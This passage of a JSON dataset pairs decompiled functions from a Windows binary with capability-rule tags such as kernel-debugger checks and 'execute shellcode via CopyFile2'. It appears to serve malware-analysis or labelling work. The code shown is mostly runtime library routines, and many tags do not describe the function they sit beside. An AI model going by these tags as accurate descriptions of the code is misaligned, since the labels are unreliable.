            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.00405b41(char **arg_8h, int32_t *arg_ch)\n\n{\n    uint8_t uVar1;\n    char **ppcVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    char *var_1ch;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    uint var_1h;\n    \n    if (**0x56f458 == 0) {\n        fcn.004012ad(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    uVar5 = **0x56f458;\n    puVar4 = *0x56f458 + 1;\n    var_ch = NULL;\n    var_8h = NULL;\n    if (uVar5 < 0x59) {\n    // switch table (17 cases) at 0x48bf5b\n        switch(uVar5) {\n        case 0x43:\n        case 0x44:\n        case 0x45:\n            var_1ch = \"char\";\n            goto code_r0x0048baf0;\n        case 0x46:\n        case 0x47:\n            var_1ch = \"short\";\n            var_18h = 0x5;\n            break;\n        case 0x48:\n        case 0x49:\n            var_1ch = 0x54f6a8;\n            var_18h = 0x3;\n            break;\n        case 0x4a:\n        case 0x4b:\n            var_1ch = \"long\";\ncode_r0x0048baf0:\n            var_18h = 0x4;\n            break;\n        case 0x4c:\n            goto code_r0x0048bba3;\n        case 0x4d:\n            var_1ch = \"float\";\n            var_18h = 0x5;\n            goto code_r0x0048bb3f;\n        case 0x4f:\n            var_1ch = \"long \";\n            var_18h = 0x5;\n            *0x56f458 = puVar4;\n            fcn.004022a2(&var_1ch);\n            puVar4 = *0x56f458;\n        case 0x4e:\n            *0x56f458 = puVar4;\n            var_1ch = \"double\";\n            var_18h = 0x6;\n            fcn.00405c95(&var_1ch);\n            goto code_r0x0048bbc8;\n        case 0x50:\n        case 0x51:\n        case 0x52:\n        case 0x53:\n            uVar5 = uVar5 & 3;\n            *0x56f458 = puVar4;\ncode_r0x0048bdc3:\n            var_ch = NULL;\n            var_8h = NULL;\n            var_1ch = *arg_ch;\n            var_18h = arg_ch[1];\n            if (uVar5 != 0xfffffffe) {\n                if (var_1ch == NULL) {\n                    if ((uVar5 & 1) == 0) {\n                        if ((uVar5 & 2) != 0) {\n                            var_14h = \"volatile\";\n                            var_10h = 0x8;\n                            fcn.004022a2(&var_14h);\n                        }\n                    }\n                    else {\n                        var_14h = \"const\";\n                        var_10h = 0x5;\n                        fcn.004022a2(&var_14h);\n                        if ((uVar5 & 2) != 0) {\n                            var_14h = \" volatile\";\n                            var_10h = 0x9;\n                            fcn.00405c95(&var_14h);\n                        }\n                    }\n                }\n                fcn.00404c6e(arg_8h, &var_ch, &var_1ch, 1);\n                return arg_8h;\n            }\n            var_18h = var_18h | 0x800;\n            fcn.00404c6e(&var_14h, &var_ch, &var_1ch, 0);\n            if ((var_10h & 0x800) == 0) {\n                var_1ch = 0x54ed6c;\n                var_18h = 0x2;\n                fcn.00405c95(&var_1ch);\n            }\n            goto code_r0x0048bf38;\n        default:\n            var_1ch = \"void\";\n            var_18h = 0x4;\ncode_r0x0048bb3f:\n            *0x56f458 = puVar4;\n            fcn.004022a2(&var_1ch);\n            goto code_r0x0048bccd;\n        }\n        *0x56f458 = puVar4;\n        fcn.004022a2(&var_1ch);\ncode_r0x0048bbc8:\n        if (uVar5 != 0x43) {\n            if ((((uVar5 != 0x45) && (uVar5 != 0x47)) && (uVar5 != 0x49)) && (uVar5 != 0x4b)) {\n                uVar1 = 0;\n                if (uVar5 != 0x5f) goto code_r0x0048bccd;\n                goto code_r0x0048bc84;\n            }\n            goto code_r0x0048bc9f;\n        }\n        var_1ch = \"signed \";\n        var_18h = 0x7;\n        goto code_r0x0048bca6;\n    }\n    if (uVar5 != 0x5f) {\ncode_r0x0048bba3:\n        ppcVar2 = fcn.00401375(&var_1ch);\n        var_14h = *ppcVar2;\n        var_10h = ppcVar2[1];\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) {\ncode_r0x0048bf38:\n            *arg_8h = var_14h;\n            arg_8h[1] = var_10h;\n            return arg_8h;\n        }\n        goto code_r0x0048bbc8;\n    }\n    var_1h._0_1_ = *puVar4;\n    *0x56f458 = *0x56f458 + 2;\n    if (var_1h < 0x4e) {\n        if (var_1h == 0x4d) {\ncode_r0x0048bd80:\n            var_1ch = \"__int128\";\n            goto code_r0x0048bd87;\n        }\n        if (var_1h < 0x48) {\n            if (var_1h != 0x47) {\n                if (var_1h == 0) {\n                    *0x56f458 = puVar4;\n                    fcn.00402e8c(1);\n                    uVar1 = var_1h;\n                    goto code_r0x0048bc84;\n                }\n                if (var_1h == 0x24) {\n                    var_1ch = \"__w64 \";\n                    var_18h = 0x6;\n                    uVar3 = fcn.00405b41(&var_14h, arg_ch);\n                    fcn.00404025(arg_8h, &var_1ch, uVar3);\n                    return arg_8h;\n                }\n                if ((var_1h == 0x44) || (var_1h == 0x45)) {\n                    var_1ch = \"__int8\";\n                    var_18h = 0x6;\n                    goto code_r0x0048bc75;\n                }\n                if (var_1h != 0x46) goto code_r0x0048bc67;\n            }\n            var_1ch = \"__int16\";\n        }\n        else if ((var_1h == 0x48) || (var_1h == 0x49)) {\n            var_1ch = \"__int32\";\n        }\n        else {\n            if ((var_1h != 0x4a) && (var_1h != 0x4b)) {\n                if (var_1h != 0x4c) goto code_r0x0048bc67;\n                goto code_r0x0048bd80;\n            }\n            var_1ch = \"__int64\";\n        }\n        goto code_r0x0048bc6e;\n    }\n    // switch table (12 cases) at 0x48bf93\n    switch(var_1h) {\n    case 0x4e:\n        var_1ch = \"bool\";\n        goto code_r0x0048beae;\n    case 0x4f:\n        uVar5 = 0xfffffffe;\n        goto code_r0x0048bdc3;\n    case 0x50:\n        var_1ch = \"auto\";\ncode_r0x0048beae:\n        var_18h = 0x4;\n        break;\n    case 0x51:\n        var_1ch = \"char8_t\";\n        goto code_r0x0048bc6e;\n    case 0x52:\n        var_1ch = \"<unknown>\";\n        var_18h = 0x9;\n        break;\n    case 0x53:\n        var_1ch = \"char16_t\";\n        goto code_r0x0048bd87;\n    case 0x54:\n        var_1ch = \"decltype(auto)\";\n        var_18h = 0xe;\n        break;\n    case 0x55:\n        var_1ch = \"char32_t\";\ncode_r0x0048bd87:\n        var_18h = 0x8;\n        break;\n    default:\ncode_r0x0048bc67:\n        var_1ch = \"UNKNOWN\";\n        goto code_r0x0048bc6e;\n    case 0x57:\n        var_1ch = \"wchar_t\";\ncode_r0x0048bc6e:\n        var_18h = 0x7;\n        break;\n    case 0x58:\n    case 0x59:\n        *0x56f458 = puVar4;\n        ppcVar2 = fcn.00401375(&var_1ch);\n        var_14h = *ppcVar2;\n        var_10h = ppcVar2[1];\n        uVar1 = var_1h;\n        var_ch = var_14h;\n        var_8h = var_10h;\n        if (var_14h == NULL) goto code_r0x0048bf38;\n        goto code_r0x0048bc84;\n    }\ncode_r0x0048bc75:\n    fcn.004022a2(&var_1ch);\n    uVar1 = var_1h;\ncode_r0x0048bc84:\n    if ((((uVar1 == 0x45) || (uVar1 == 0x47)) || (uVar1 == 0x49)) || ((uVar1 == 0x4b || (uVar1 == 0x4d)))) {\ncode_r0x0048bc9f:\n        var_18h = 0x9;\n        var_1ch = \"unsigned \";\ncode_r0x0048bca6:\n        fcn.00402cfc(&var_1ch);\n        fcn.004052f9(&var_1ch, &var_ch);\n        var_ch = var_1ch;\n        var_8h = var_18h;\n    }\ncode_r0x0048bccd:\n    if (*arg_ch != 0) {\n        uVar3 = fcn.00402e87(&var_1ch, 0x20, arg_ch);\n        fcn.00402eb9(uVar3);\n    }\n    *arg_8h = var_ch;\n    arg_8h[1] = var_8h;\n    return arg_8h;\n}\n",
        "token_count": 2743
    },
    "004932ad": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.004932ad(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        goto code_r0x00493402;\n    }\n    fcn.004057e5(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0040335a(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.00403869();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x004933da;\ncode_r0x00493425:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00493425;\n                    goto code_r0x004933da;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x004933da:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.00404647();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00493402:\n    fcn.00403085(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 801
    },
    "0049348a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0049348a(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        goto code_r0x004935e5;\n    }\n    fcn.004057e5(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00402ad1(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.00404417();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x004935ba;\ncode_r0x00493608:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00493608;\n                    goto code_r0x004935ba;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x004935ba:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.00404647();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x004935e5:\n    fcn.00403085(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 810
    },
    "00493ab5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00493ab5(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        goto code_r0x00493c0a;\n    }\n    fcn.004057e5(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.0040335a(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.004041d3();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00493be2;\ncode_r0x00493c2d:\n                    *(puVar1 + arg_14h + -1) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00493c2d;\n                    goto code_r0x00493be2;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00493be2:\n            *(puVar1 + var_468h) = 0;\n        }\n    }\n    fcn.00404647();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00493c0a:\n    fcn.00403085(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 814
    },
    "00493c92": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00493c92(uint32_t arg_8h, uint arg_ch, uint *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t in_stack_fffffb5c;\n    int32_t var_484h;\n    uint var_480h;\n    uint var_478h;\n    uint32_t var_474h;\n    uint *var_470h;\n    int32_t var_46ch;\n    int32_t var_468h;\n    uint var_464h;\n    uint *var_460h;\n    uint var_45ch;\n    uint var_41ch;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    var_460h = arg_10h;\n    if ((arg_18h == 0) || ((arg_14h != 0 && (arg_10h == NULL)))) {\n        puVar1 = fcn.004039a4();\n        *puVar1 = 0x16;\n        fcn.00403751();\n        goto code_r0x00493ded;\n    }\n    fcn.004057e5(arg_1ch);\n    puVar1 = var_460h;\n    var_474h = arg_8h & 2;\n    var_470h = var_460h;\n    var_46ch = arg_14h;\n    var_468h = 0;\n    if ((var_474h != 0) || (var_464h = 0,  var_460h == NULL)) {\n        var_464h = 1;\n    }\n    var_460h = &var_470h;\n    fcn.00402ad1(&var_460h, arg_8h, arg_ch, arg_18h, &var_480h, arg_20h);\n    var_ch = 0;\n    iVar2 = fcn.00402fd6();\n    if (puVar1 != NULL) {\n        if ((arg_8h & 1) == 0) {\n            if (var_474h == 0) {\n                if (arg_14h != 0) {\n                    if (var_468h != arg_14h) goto code_r0x00493dc2;\ncode_r0x00493e10:\n                    *(puVar1 + arg_14h * 2 + -2) = 0;\n                }\n            }\n            else if (arg_14h != 0) {\n                if (-1 < iVar2) {\n                    if (var_468h == arg_14h) goto code_r0x00493e10;\n                    goto code_r0x00493dc2;\n                }\n                *puVar1 = 0;\n            }\n        }\n        else if (((arg_14h != 0) || (iVar2 == 0)) && (var_468h != arg_14h)) {\ncode_r0x00493dc2:\n            *(puVar1 + var_468h * 2) = 0;\n        }\n    }\n    fcn.00404647();\n    in_stack_fffffb5c = arg_18h;\n    if (var_478h != '\\0') {\n        *(var_484h + 0x350) = *(var_484h + 0x350) & 0xfffffffd;\n    }\ncode_r0x00493ded:\n    fcn.00403085(in_stack_fffffb5c);\n    return;\n}\n",
        "token_count": 814
    },
    "004d1f8a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nuint __cdecl fcn.004d1f8a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint32_t lpCriticalSection;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56b458, 0x10);\n    lpCriticalSection = *(unaff_EBP + 8);\n    if (lpCriticalSection == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n    }\n    else {\n        if ((-1 < lpCriticalSection) && (lpCriticalSection < *0x570488)) {\n            iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n            *(unaff_EBP + -0x20) = iVar3;\n            if ((*(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28 + iVar3) & 1) != 0) {\n                fcn.0040151e(lpCriticalSection);\n                uVar2 = 0xffffffff;\n                *(unaff_EBP + -0x1c) = 0xffffffff;\n                *(unaff_EBP + -4) = 0;\n                if ((*(*((lpCriticalSection >> 6) * 4 + 0x570220) + 0x28 + *(unaff_EBP + -0x20)) & 1) == 0) {\n                    puVar1 = fcn.004039a4();\n                    *puVar1 = 9;\n                    puVar1 = fcn.0040185c();\n                    *puVar1 = 0;\n                }\n                else {\n                    uVar2 = fcn.004d1d95(lpCriticalSection, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar2;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004d1bd7();\n                goto code_r0x004d1bfa;\n            }\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.004039a4();\n        *puVar1 = 9;\n        fcn.00403751();\n    }\n    uVar2 = 0xffffffff;\ncode_r0x004d1bfa:\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 667
    },
    "0040101e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040101e(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401889(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105f(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 470
    },
    "00401262": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401262(uint32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (arg_8h != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        uVar3 = arg_8h % arg_ch + 0x30 & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_10h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n        arg_8h = arg_8h / arg_ch;\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 395
    },
    "004012e4": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012e4(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00405911();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "004018a2": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004018a2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403acb();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 454
    },
    "00401b1d": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401b1d(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_ch._2_2_ & 0x7ff0) == 0x7ff0) {\n        iVar1 = fcn.004051b9(arg_8h, CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)) >> 0x20);\n        if (iVar1 == 1) {\n            return 0x200;\n        }\n        if (iVar1 == 2) {\n            iVar1 = 4;\n        }\n        else {\n            if (iVar1 != 3) {\n                return 1;\n            }\n            iVar1 = 2;\n        }\n        return iVar1;\n    }\n    if (((arg_ch & 0x7ff00000) == 0) && (((arg_ch & 0xfffff) != 0 || (arg_8h != 0)))) {\n        return (-((arg_ch & 0x80000000) != 0) & 0xffffff90) + 0x80;\n    }\n    if (CONCAT26(arg_ch._2_2_, CONCAT24(arg_ch, arg_8h)) == 0.0) {\n        return (-((arg_ch & 0x80000000) != 0) & 0xffffffe0) + 0x40;\n    }\n    return (-((arg_ch & 0x80000000) != 0) & 0xffffff08) + 0x100;\n}\n",
        "token_count": 347
    },
    "00401f5a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00401f5a(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.00404737(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.00405911();\n        iVar2 = fcn.00401f32(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 453
    },
    "0040222a": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
